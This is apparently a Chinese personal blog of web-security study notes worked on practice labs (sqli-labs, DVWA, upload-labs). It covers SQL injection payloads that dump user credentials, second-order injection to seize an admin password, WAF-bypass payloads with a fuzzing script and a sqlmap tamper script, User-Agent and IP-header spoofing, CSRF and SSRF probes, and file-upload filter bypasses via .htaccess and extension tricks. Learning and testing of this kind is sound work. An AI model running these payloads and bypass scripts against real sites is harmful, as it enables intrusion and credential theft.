<p>查看users里面所有账户和密码<br>Cookie: uname= ’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from security.users–+</p>
<h3 id="有加密的cooke注入"><a href="#有加密的cooke注入" class="headerlink" title="有加密的cooke注入"></a>有加密的cooke注入</h3><p><img src="https://s2.loli.net/2022/03/06/P74nvNzbSgs2jqD.png"><br><img src="https://s2.loli.net/2022/03/06/1PQUld8SVxB9ebj.png"></p>
<p>可发现uname处有base64加密</p>
<p>根据报错信息得知还需要在单引号后加上右括号</p>
<p>admin’) 然后进行编码，报错<br>admin’) #然后进行编码，回显正常<br>说明闭合方式为 ( ‘ ‘ )</p>
<p>注入Cookie uname=</p>
<p>1’) union select </p>
<p>MScpIHVuaW9uIHNlbGVjdCA=<br><img src="https://s2.loli.net/2022/03/06/eCLz2hfoD8RZ7Hs.png"></p>
<p>本题需要注意的是闭合方式为 ( ‘ ‘ ) 和 加密注入</p>
<h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><p>在任何界面进行注入应该都是无效的，因为操作失败时会跳转到其他页面，而没有任何例如错误的回显信息。此处考虑的就不是之前那些把敏感信息弄出来的注入了，而是考虑利用改密码操作夺取其他账号的控制权。此处我们考虑二次注入，首先我们构造一个特殊的用户，该用户的用户名为 “admin’#”，密码随便设</p>
<p>使用admin’#进行登录</p>
<p><img src="https://s2.loli.net/2022/03/06/WXGEpZQUNFj3mfH.png"></p>
<p>登录成功后，更改密码为123</p>
<p><img src="https://s2.loli.net/2022/03/06/vdAEMFxzSgWe7NK.png"></p>
<p>返回主界面使用账户：admin 密码：123登录</p>
<p>此时如果将这个用户作为过滤条件实现记录的修改，该用户名后面的 “’#” 不仅能闭合字段，也能把后面的内容注释掉。而且成功闭合后，我们实际上操作的用户名应该是 “admin”。修改密码成功之后，使用用户名 “admin” 和我们修改的密码进行登录，发现我们夺去了该用户的密码，登录成功</p>
<p>如果用户名是 “admin’#”，则 SQL 语句会变成这样。</p>
<pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; </code></pre>
<p>由于此时符号没有转义，因此该用户名的 “#” 在 SQL 语句中会当做是注释</p>
<pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;admin&#39;#</code></pre>
<p>因此实现了修改admin的密码。</p>
<h3 id="DNS等注入"><a href="#DNS等注入" class="headerlink" title="DNS等注入"></a>DNS等注入</h3><p>暂时没成功</p>
<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p><img src="https://s2.loli.net/2022/03/07/G5ukCMqv6BQUHoE.png"></p>
<pre><code>数据库特性（补充）
%23x%0aunion%23x%0Aselect%201,2,3    
%20/*!44509union*/%23x%0aselect%201,2,3
id=1/**&amp;id=-1%20union%20select%201,2,3%23*/
%20union%20all%23%0a%20select%201,2,3%23</code></pre>
<p>分析下句<br>    %20union%20/<em>!44509select</em>/%201,2,3</p>
<p>在看下句<br>    /*!50001 select * from test */</p>
<p>数据库特性，当数据库版本高于5.00.01时才会执行</p>
<pre><code>/*!50001 select * from test */
这样就真的注释掉，不会执行了</code></pre>
<h2 id="FUZZ绕过脚本"><a href="#FUZZ绕过脚本" class="headerlink" title="FUZZ绕过脚本"></a>FUZZ绕过脚本</h2><pre><code>#!/usr/bin/envpython

&quot;&quot;&quot;
Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)
Seethefile&#39;LICENSE&#39;forcopyingpermission
&quot;&quot;&quot;

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__=PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s&quot;%(os.path.basename(__file__).split(&quot;.&quot;)[0],DBMS.MYSQL))

def tamper(payload,**kwargs):

#%23a%0aunion/*!44575select*/1,2,3
    if payload:
        payload=payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;)
        payload=payload.replace(&quot;select&quot;,&quot;/*!44575select*/&quot;)
        payload=payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;)
        payload=payload.replace(&quot;&quot;,&quot;%23a%0a&quot;)
        payload=payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;)
    return payload

import requests,time

url=&#39;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#39;
union=&#39;union&#39;
select=&#39;select&#39;
num=&#39;1,2,3&#39;
a=&#123;&#39;%0a&#39;,&#39;%23&#39;&#125;
aa=&#123;&#39;x&#39;&#125;
aaa=&#123;&#39;%0a&#39;,&#39;%23&#39;&#125;
b=&#39;/*!&#39;
c=&#39;*/&#39;
def bypass():
    for xiaodi in a:
        for xiaodis in aa:
            for xiaodiss in aaa:
                for two in range(44500,44600):
                    urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiao
diss+num
                    #urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xia
odiss+num
                    try:
                        result=requests.get(urls).text
                        len_r=len(result)
                        if (result.find(&#39;safedog&#39;)==-1):
                            #print(&#39;bypass url addreess：&#39;+urls+&#39;|&#39;+str(len_r))
                             print(&#39;bypass url addreess：&#39;+urls+&#39;|&#39;+str(len_r))
                        if len_r==715:
                             fp = open(&#39;url.txt&#39;,&#39;a+&#39;)
                             fp.write(urls+&#39;\n&#39;)
                             fp.close()
                    except Exception as err:
                        print(&#39;connecting error&#39;)
                        time.sleep(0.1)
if__name__==&#39;__main__&#39;:
    print(&#39;fuzz strat!&#39;)
    bypass()</code></pre>
<h2 id="伪造成百度爬虫脚本"><a href="#伪造成百度爬虫脚本" class="headerlink" title="伪造成百度爬虫脚本"></a>伪造成百度爬虫脚本</h2><pre><code>import json
import requests

url=&#39;http://192.168.0.103:8080/&#39;

head=&#123;
    &#39;User-Agent&#39;:&#39;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#39;
&#125;
for data in open(&#39;PH1P.txt&#39;):
    data=data.replace(&#39;\n&#39;,&#39;&#39;)
    urls=url+data
    code=requests.get(urls.headers=head).status_code
    print(urls+&#39;|&#39;+str(code))</code></pre>
<h2 id="sqlmap-temper脚本使用教程"><a href="#sqlmap-temper脚本使用教程" class="headerlink" title="sqlmap temper脚本使用教程"></a>sqlmap temper脚本使用教程</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p>
<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><p>方式一：IP白名单</p>
<p>通过对网站ip地址的伪造，知道对方网站ip地址，那就默认为ip地址为白名单。</p>
<p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的ip，这样就饿可能存在伪造ip绕过的情况。</p>
<p>测试方法：修改http的header来by pass waf</p>
<pre><code>X-forwarded-for
X-remote-IP
X-remote-addr
X-Real-IP</code></pre>
<p>方式二：静态资源</p>
<p>特定的静态资源后缀请求，常见的静态文件(.js、.jpg、.swf、.css等），类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sql.php?id=1">http://127.0.0.1/sql.php?id=1</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sql.php/1.js?id=1">http://127.0.0.1/sql.php/1.js?id=1</a></p>
<p>备注：Aspx/php只识别到前面的.aspx/.php，后面基本不识别。</p>
<p><img src="https://s2.loli.net/2022/03/07/iRaKymxZogBM98S.png"></p>
<p>方式三：url白名单</p>
<p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。</p>
<p>只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势<br>涉及资源：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/sql%E6%B3%A8%E5%85%A5/" data-id="cl1qo0hqr000048v81b9b26zz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CSRF&amp;SSRF" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/CSRF&SSRF/" class="article-date">
  <time datetime="2022-03-16T08:09:39.810Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/CSRF&SSRF/">Web学习  SCRF &amp;&amp; SSRF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SCRF-amp-amp-SSRF"><a href="#SCRF-amp-amp-SSRF" class="headerlink" title="SCRF &amp;&amp; SSRF"></a>SCRF &amp;&amp; SSRF</h1><p><img src="https://s2.loli.net/2022/03/15/mSkg3IOyhbzxacf.png"></p>
<p>csrf全称为：Cross-site request forgery，是一种常见的web攻击。在场景中，攻击者会伪造一个请求（通常是一个链接），然后欺骗目标用户点击，用户一旦点击，攻击也就完成了。</p>
<p>与xss的区别：csrf是借助用户的权限完成攻击，攻击者并没有拿到权限；而xss是直接盗取用户权限去进行破坏。</p>
<p>我们可以看到low难度的源代码中，并没有隐藏的token，这样我们的难度就小了很多。<br>然后我猜测这里的密码检测是直接将输入的进行拼接，检验password_new与password_conf是否一致。</p>
<p>于是可以先伪造一个简陋的链接：<br><a target="_blank" rel="noopener" href="http://192.168.1.102/dvwa-master/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.1.102/dvwa-master/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>（注：里面的ip要改成自己的）</p>
<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机 Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，<br>黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p>
<p>代码演示<br>未进行 csrf 校验的 WebA<br>后端代码实现</p>
<pre><code>from flask import Flask, render_template, make_response
from flask import redirect
from flask import request
from flask import url_for

app = Flask(__name__)


@app.route(&#39;/&#39;, methods=[&quot;POST&quot;, &quot;GET&quot;])
def index():
    if request.method == &quot;POST&quot;:
        # 取到表单中提交上来的参数
        username = request.form.get(&quot;username&quot;)
        password = request.form.get(&quot;password&quot;)

        if not all([username, password]):
            print(&#39;参数错误&#39;)
        else:
            print(username, password)
            if username == &#39;laowang&#39; and password == &#39;1234&#39;:
                # 状态保持，设置用户名到cookie中表示登录成功
                response = redirect(url_for(&#39;transfer&#39;))
                response.set_cookie(&#39;username&#39;, username)
                return response
            else:
                print(&#39;密码错误&#39;)

    return render_template(&#39;temp_login.html&#39;)


@app.route(&#39;/transfer&#39;, methods=[&quot;POST&quot;, &quot;GET&quot;])
def transfer():
    # 从cookie中取到用户名
    username = request.cookies.get(&#39;username&#39;, None)
    # 如果没有取到，代表没有登录
    if not username:
        return redirect(url_for(&#39;index&#39;))

    if request.method == &quot;POST&quot;:
        to_account = request.form.get(&quot;to_account&quot;)
        money = request.form.get(&quot;money&quot;)
        print(&#39;假装执行转操作，将当前登录用户的钱转账到指定账户&#39;)
        return &#39;转账 %s 元到 %s 成功&#39; % (money, to_account)

    # 渲染转换页面
    response = make_response(render_template(&#39;temp_transfer.html&#39;))
    return response

if __name__ == &#39;__main__&#39;:
    app.run(debug=True, port=9000)</code></pre>
<p>前端登录页面代码</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;登录&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;h1&gt;我是网站A，登录页面&lt;/h1&gt;

&lt;form method=&quot;post&quot;&gt;
    &lt;label&gt;用户名：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;请输入用户名&quot;&gt;&lt;br/&gt;
    &lt;label&gt;密码：&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;请输入密码&quot;&gt;&lt;br/&gt;
    &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;
前端转账页面代码
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;转账&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;我是网站A，转账页面&lt;/h1&gt;

&lt;form method=&quot;post&quot;&gt;
    &lt;label&gt;账户：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;to_account&quot; placeholder=&quot;请输入要转账的账户&quot;&gt;&lt;br/&gt;
    &lt;label&gt;金额：&lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;money&quot; placeholder=&quot;请输入转账金额&quot;&gt;&lt;br/&gt;
    &lt;input type=&quot;submit&quot; value=&quot;转账&quot;&gt;
&lt;/form&gt;</code></pre>



<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://s2.loli.net/2022/03/15/blGVugXh7Qw9OJF.png"></p>
<p><img src="https://s2.loli.net/2022/03/15/anlIMmjthJPL5R9.png"></p>
<p>​什么是SSRF</p>
<p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)</p>
<p>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标</p>
<p>攻击者要求服务器为他访问URL</p>
<h2 id="SSRF作用"><a href="#SSRF作用" class="headerlink" title="SSRF作用"></a>SSRF作用</h2><p>端口扫描，指纹识别，漏洞利用，内网探针等</p>
<pre><code>探测各种协议
http://192.168.64.144/phpmyadmin/
file:///D:/www.txt
dict://192.168.64.144:3306/info
ftp://192.168.64.144:21</code></pre>
<p>探测网站的信息</p>
<p><img src="https://s2.loli.net/2022/03/15/Bd4Nap8UE6VyH7m.png"><br><img src="https://s2.loli.net/2022/03/15/5KPbj7vkOYfBCTo.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/03/16/CSRF&SSRF/" data-id="cl0ta9sww00079sv84teg7yaf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-03-16T08:09:34.960Z" itemprop="datePublished">2022-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">Web学习 文件上传漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p>
<p><img src="https://s2.loli.net/2022/03/07/FkIE8U3sZcWwmSB.png"></p>
<p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p>
<p>CMS类：已知CMS源码，搜索已知cms漏洞</p>
<p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p>
<p>配合解析漏洞下的文件类型后门：可以通过解析漏洞，上传包含后门代码的图片</p>
<h1 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法"></a>上传方法</h1><p>方法一</p>
<pre><code>先直接传一个PHP，实战先传马。
实战先传一个正常的图片，看看有无返回存储地址。
如果能直接上传并解析，已离成功不远。</code></pre>
<p>方法二<br>    先传一个shell，然后进行修改。<br>    connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a<br>    当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p>
<p>方法三<br>    上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。<br>    黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,pht<br>    phtml,等方式<br>    我们继续上传一个/htaccess文件<br>    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马<br>    如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</p>
<p>方法四<br>    如果白名单限制上传<br>    考虑00截断上传<br>    文件包含漏洞+图片马<br>    文件包含漏洞+二次渲染+图片马</p>
<p> 方法五<br>    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。<br>    以上均不行，考虑逻辑层面的思路。</p>
<p>涉及资源</p>
<p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<h1 id="后端黑白名单绕过"><a href="#后端黑白名单绕过" class="headerlink" title="后端黑白名单绕过"></a>后端黑白名单绕过</h1><p><img src="https://s2.loli.net/2022/03/07/aiUkwWcKQ23tbhu.png"></p>
<h2 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证"></a>文件上传常见验证</h2><p>后缀名（直接），类型（间接），文件头等 </p>
<h2 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h2><p>黑名单，白名单 </p>
<p>黑名单：</p>
<p>明确不允许上传的格式后缀</p>
<p>asp php jsp aspx cgi war 等</p>
<p>如果php phtml..没有定义到后名单里，可以用这格式绕过限制，依旧可以达到效果</p>
<h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><p>明确可以上传的格式后缀</p>
<p>jpg png zip rar gif 等 </p>
<p>要白名单验证要更安全</p>
<h2 id="文件类型：MIME-信息"><a href="#文件类型：MIME-信息" class="headerlink" title="文件类型：MIME 信息"></a>文件类型：MIME 信息</h2><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，</p>
<p>当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p>
<p>Content-Type称之为MIME信息</p>
<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="upload-lab-01"><a href="#upload-lab-01" class="headerlink" title="upload-lab-01"></a>upload-lab-01</h2><p>由于采用了前端验证，所以可以通过抓包直接修改文件格式，从而绕过。</p>
<p><img src="https://s2.loli.net/2022/03/23/QCE41wxqontGHrL.gif"></p>
<h2 id="upload-lab-02"><a href="#upload-lab-02" class="headerlink" title="upload-lab-02"></a>upload-lab-02</h2><p>拦截上传shell.php的请求包，修改文件类型为：image/jpeg或者image/png或者image/gif</p>
<p><img src="https://s2.loli.net/2022/03/24/6Aca5fzwNdjobms.gif"><br><img src="https://s2.loli.net/2022/03/24/l5uALgperktxi4v.gif"></p>
<h2 id="upload-lab-03"><a href="#upload-lab-03" class="headerlink" title="upload-lab-03"></a>upload-lab-03</h2><p>采用了黑名单的过滤方式</p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) &#123;
    if (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) &#123;
            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH. &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
                 $img_path = UPLOAD_PATH .&#39;/&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
                 $is_upload = true;
            &#125;
        &#125; else &#123;
            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
        &#125;
    &#125; else &#123;
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    &#125;
&#125;</code></pre>
<p>php,phps,php3,php5,pht等都有可能被解析成php文件的，当然这得取决apache的配置。先试试看，通过Burpsuite改包上传成功。</p>
<p><img src="https://s2.loli.net/2022/03/24/MlVKgHSwvrYZGjk.gif"></p>
<h2 id="upload-lab-04"><a href="#upload-lab-04" class="headerlink" title="upload-lab-04"></a>upload-lab-04</h2><p>利用 .htaccess 文件进行绕过</p>
<p>其内容为 AddType application/x-httpd-php .jpg </p>
<p>可以将jpg格式的文件作为php文件进行解析</p>
<p>先上传 .htaccess 文件再上传 hacker.jpg 文件</p>
<p><img src="https://s2.loli.net/2022/03/24/Ln3cIsklBDmi58P.gif"></p>
<h2 id="upload-lab-05"><a href="#upload-lab-05" class="headerlink" title="upload-lab-05"></a>upload-lab-05</h2><p>大小写绕过，window上搭载的服务器是不区分大小写的，而Linux上的服务器是区分的，所以win上搭载的服务器可以通过大小写绕过防护。</p>
<p><img src="https://s2.loli.net/2022/03/24/qeAldP92rawGfgJ.gif"></p>
<h2 id="upload-lab-06"><a href="#upload-lab-06" class="headerlink" title="upload-lab-06"></a>upload-lab-06</h2><p>还是黑名单限制，通过查看源代码，知道删除了文件名后面的., 但是并没有删除空格，所以通过上传一个后缀名再添加一个空格的文件去绕过黑名单，windoes在创建文件时会自动删掉最后的空格。</p>
<pre><code>$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) &#123;
    if (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA

        if (!in_array($file_ext, $deny_ext)) &#123;
            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;
                $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name;
                $is_upload = true;
            &#125;
        &#125; else &#123;
            $msg = &#39;此文件不允许上传&#39;;
        &#125;
    &#125; else &#123;
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    &#125;
&#125;</code></pre>
<p><img src="https://s2.loli.net/2022/03/23/dAVljKaMC1uJ7xH.gif"></p>
<h2 id="upload-lab-07"><a href="#upload-lab-07" class="headerlink" title="upload-lab-07"></a>upload-lab-07</h2><p>在第七行发现，原来是没有过滤末尾的点呀，吸取上一次的教训，直接修改后缀名在后面加.是不可以的，因为会被win自动过滤</p>
<p>所以还是使用抓包修改</p>
<p>1</p>
<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) &#123;
        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
        if (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = true;
        &#125; else &#123;
            $msg = &#39;上传出错！&#39;;
        &#125;
    &#125; else &#123;
        $msg = &#39;此文件类型不允许上传！&#39;;
    &#125;
&#125; else &#123;
    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
&#125;</code></pre>
<p>}</p>
<p>2</p>
<p>$is_upload = false;<br>$msg = null;<br>if (isset($_POST[‘submit’])) {<br>    if (file_exists(UPLOAD_PATH)) {<br>        $deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”);<br>        $file_name = trim($_FILES[‘upload_file’][‘name’]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, ‘.’);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(‘::$DATA’, ‘’, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //收尾去空</p>
<pre><code>    if (!in_array($file_ext, $deny_ext)) &#123;
        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
        if (move_uploaded_file($temp_file, $img_path)) &#123;
            $is_upload = true;
        &#125; else &#123;
            $msg = &#39;上传出错！&#39;;
        &#125;
    &#125; else &#123;
        $msg = &#39;此文件不允许上传!&#39;;
    &#125;
&#125; else &#123;
    $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
&#125;</code></pre>
<p>}</p>
<h2 id="upload-lab-08"><a href="#upload-lab-08" class="headerlink" title="upload-lab-08"></a>upload-lab-08</h2><p>和7一样的</p>
<p>$file_name = deldot($file_name);//删除文件名末尾的点</p>
<p>少了这个过滤，</p>
<p>所以我们可以进行文件名加点绕过。</p>
<p>Windows有个特性，就是如果文件名后缀以.或者空格结尾的，系统在保存文件时会自动去除点和空格。所以可以通过在文件名后面增加一个点来绕过限制</p>
<h2 id="upload-lab-09"><a href="#upload-lab-09" class="headerlink" title="upload-lab-09"></a>upload-lab-09</h2><p>源码截取</p>
